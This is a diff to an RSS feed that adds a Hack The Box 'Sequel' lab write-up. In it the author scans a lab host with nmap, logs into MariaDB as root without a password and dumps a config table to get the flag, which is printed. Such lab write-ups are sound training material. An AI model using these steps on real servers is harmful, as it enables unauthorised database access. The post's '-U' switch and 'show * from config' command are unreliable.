@@ -8,8 +8,209 @@
     <language>en</language>
     <managingEditor>leewookb@gmail.com (Wook Lee)</managingEditor>
     <webMaster>leewookb@gmail.com (Wook Lee)</webMaster>
-    <lastBuildDate>Thu, 11 Jul 2024 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Fri, 12 Jul 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>[HTB] Sequel</title>
+      <link>http://localhost:1313/htb-sequel/</link>
+      <pubDate>Fri, 12 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/htb-sequel/</guid>
+      <description>During our scan, which port do we find serving MySQL? 3306 1┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-0x7zvm1bat]─[~] 2└──╼ [★]$ nmap -sC -sV 10.129.50.55 -p- 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 23:56 CDT 4Nmap scan report for 10.129.50.55 5Host is up (0.0084s latency). 6Not shown: 65534 closed tcp ports (reset) 7PORT STATE SERVICE VERSION 83306/tcp open mysql? 9| mysql-info: 10| Protocol: 10 11| Version: 5.5.5-10.3.27-MariaDB-0+deb10u1 12| Thread ID: 66 13| Capabilities flags: 63486 14| Some Capabilities: Speaks41ProtocolOld, Support41Auth, SupportsTransactions, SupportsCompression, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, ODBCClient, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults 15| Status: Autocommit 16| Salt: 6&amp;#39;\|}}|xdny7D0ay_OOz 17|_ Auth Plugin Name: mysql_native_password 18 19Service detection performed.</description>
+      <content:encoded><![CDATA[<h4 id="during-our-scan-which-port-do-we-find-serving-mysql">During our scan, which port do we find serving MySQL?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>3306</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-0x7zvm1bat<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sC -sV 10.129.50.55 -p-
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-11 23:56 CDT
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.50.55
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.0084s latency<span style="color:#89dceb;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">65534</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>reset<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>3306/tcp open  mysql?
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>| mysql-info:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>|   Protocol: <span style="color:#fab387">10</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>|   Thread ID: <span style="color:#fab387">66</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>|   Capabilities flags: <span style="color:#fab387">63486</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>|   Some Capabilities: Speaks41ProtocolOld, Support41Auth, SupportsTransactions, SupportsCompression, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, ODBCClient, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>|   Status: Autocommit
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>|   Salt: 6<span style="color:#f38ba8">&#39;</span><span style="color:#89b4fa">\|</span><span style="color:#89dceb;font-weight:bold">}}</span>|xdny7D0ay_OOz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>|_  Auth Plugin Name: mysql_native_password
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 204.84 seconds</span></span></code></pre></div>
+<br>
+<h4 id="what-community-developed-mysql-version-is-the-target-running">What community-developed MySQL version is the target running?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>MariaDB</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>| mysql-info:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>|   Protocol: <span style="color:#fab387">10</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>|   Thread ID: <span style="color:#fab387">66</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>|   Capabilities flags: <span style="color:#fab387">63486</span></span></span></code></pre></div>
+<br>
+<h4 id="when-using-the-mysql-command-line-client-what-switch-do-we-need-to-use-in-order-to-specify-a-login-username">When using the MySQL command line client, what switch do we need to use in order to specify a login username?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>-U</code></pre>
+<p>The option could be found by the <code>mysql --help</code> command</p>
+<p><img src="image.png#center" alt="alt text"></p>
+<br>
+<h4 id="which-username-allows-us-to-log-into-this-mariadb-instance-without-providing-a-password">Which username allows us to log into this MariaDB instance without providing a password?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>root</code></pre>
+<p>I attempted to login as root without password and it was accepted.</p>
+<p><code>mysql -h {target IP address} -u {username}</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-0x7zvm1bat<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ mysql -h 10.129.50.55 -u root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Welcome to the MariaDB monitor.  Commands end with ; or <span style="color:#89b4fa">\g</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Your MariaDB connection id is <span style="color:#fab387">74</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Server version: 10.3.27-MariaDB-0+deb10u1 Debian <span style="color:#fab387">10</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Copyright <span style="color:#89dceb;font-weight:bold">(</span>c<span style="color:#89dceb;font-weight:bold">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Type <span style="color:#a6e3a1">&#39;help;&#39;</span> or <span style="color:#a6e3a1">&#39;\h&#39;</span> <span style="color:#cba6f7">for</span> help. Type <span style="color:#a6e3a1">&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>MariaDB <span style="color:#89dceb;font-weight:bold">[(</span>none<span style="color:#89dceb;font-weight:bold">)]</span>&gt;</span></span></code></pre></div>
+<br>
+<h4 id="in-sql-what-symbol-can-we-use-to-specify-within-the-query-that-we-want-to-display-everything-inside-a-table">In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>*</code></pre>
+<p><code>*</code> the asterisk symbol is used to display everything (all columns) inside a table.</p>
+<p>For example, <code>SELECT * FROM {table_name}</code></p>
+<br>
+<h4 id="in-sql-what-symbol-do-we-need-to-end-each-query-with">In SQL, what symbol do we need to end each query with?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>;</code></pre>
+<p>in SQL, we specify <code>;</code>, the semicolon to end each query, just like we end every line with the semicolon when programming in Javascript.</p>
+<br>
+<h4 id="there-are-three-databases-in-this-mysql-instance-that-are-common-across-all-mysql-instances-what-is-the-name-of-the-fourth-thats-unique-to-this-host">There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that&rsquo;s unique to this host?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>htb</code></pre>
+<p><code>SHOW DATABSES</code> command listed all the databases in the MySQL instance and <code>htb</code> is the unique one to the host.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>MariaDB [(<span style="color:#cba6f7">none</span>)]<span style="color:#89dceb;font-weight:bold">&gt;</span> <span style="color:#cba6f7">SHOW</span> DATABASES;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">--------------------+
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#cba6f7">Database</span>           <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">--------------------+
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#89dceb;font-weight:bold">|</span> htb                <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">|</span> information_schema <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#89dceb;font-weight:bold">|</span> mysql              <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span><span style="color:#89dceb;font-weight:bold">|</span> performance_schema <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">--------------------+</span></span></span></code></pre></div>
+<br>
+<h4 id="submit-root-flag">Submit root flag</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>7b4bec00d1a39e3dd4e021ec3d915da8</code></pre>
+<p>since I know the database that I&rsquo;m interested in is the <code>htb</code> database, I ran <code>use htb</code> command to change the database to htb.
+Then listed the tables belonged to the db by <code>show tables</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>MariaDB [(<span style="color:#cba6f7">none</span>)]<span style="color:#89dceb;font-weight:bold">&gt;</span> use htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Reading <span style="color:#cba6f7">table</span> information <span style="color:#cba6f7">for</span> <span style="color:#cba6f7">completion</span> <span style="color:#cba6f7">of</span> <span style="color:#cba6f7">table</span> <span style="color:#cba6f7">and</span> <span style="color:#cba6f7">column</span> <span style="color:#cba6f7">names</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>You can turn <span style="color:#cba6f7">off</span> this feature <span style="color:#cba6f7">to</span> <span style="color:#cba6f7">get</span> a quicker startup <span style="color:#cba6f7">with</span> <span style="color:#89dceb;font-weight:bold">-</span>A
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#cba6f7">Database</span> changed
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>MariaDB [htb]<span style="color:#89dceb;font-weight:bold">&gt;</span> <span style="color:#cba6f7">show</span> tables;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">---------------+
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#89dceb;font-weight:bold">|</span> Tables_in_htb <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">---------------+
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#89dceb;font-weight:bold">|</span> config        <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">|</span> users         <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">---------------+
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#fab387">2</span> <span style="color:#cba6f7">rows</span> <span style="color:#cba6f7">in</span> <span style="color:#cba6f7">set</span> (<span style="color:#fab387">0</span>.<span style="color:#fab387">009</span> sec)</span></span></code></pre></div>
+<br>
+<p>To list everything in the config table, I ran <code>show * from config</code> and there was the flag.
+<br></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>MariaDB [htb]<span style="color:#89dceb;font-weight:bold">&gt;</span> <span style="color:#cba6f7">select</span> <span style="color:#89dceb;font-weight:bold">*</span> <span style="color:#cba6f7">from</span> config;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">----+-----------------------+----------------------------------+
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#89dceb;font-weight:bold">|</span> id <span style="color:#89dceb;font-weight:bold">|</span> name <span style="color:#89dceb;font-weight:bold">|</span> value <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">----+-----------------------+----------------------------------+
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">1</span> <span style="color:#89dceb;font-weight:bold">|</span> timeout <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">60</span>s <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">2</span> <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#cba6f7">security</span> <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#cba6f7">default</span> <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">3</span> <span style="color:#89dceb;font-weight:bold">|</span> auto_logon <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#cba6f7">false</span> <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">4</span> <span style="color:#89dceb;font-weight:bold">|</span> max_size <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">2</span>M <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">5</span> <span style="color:#89dceb;font-weight:bold">|</span> flag <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">7</span>b4bec00d1a39e3dd4e021ec3d915da8 <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">6</span> <span style="color:#89dceb;font-weight:bold">|</span> enable_uploads <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#cba6f7">false</span> <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">7</span> <span style="color:#89dceb;font-weight:bold">|</span> authentication_method <span style="color:#89dceb;font-weight:bold">|</span> radius <span style="color:#89dceb;font-weight:bold">|</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">----+-----------------------+----------------------------------+
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#fab387">7</span> <span style="color:#cba6f7">rows</span> <span style="color:#cba6f7">in</span> <span style="color:#cba6f7">set</span> (<span style="color:#fab387">0</span>.<span style="color:#fab387">009</span> sec)</span></span></code></pre></div>
+<br>
+<p><img src="image-1.png#center" alt="alt text"></p>
+]]></content:encoded>
+    </item>
     <item>
       <title>[HTB] Appointment</title>
       <link>http://localhost:1313/htb-appointment/</link>
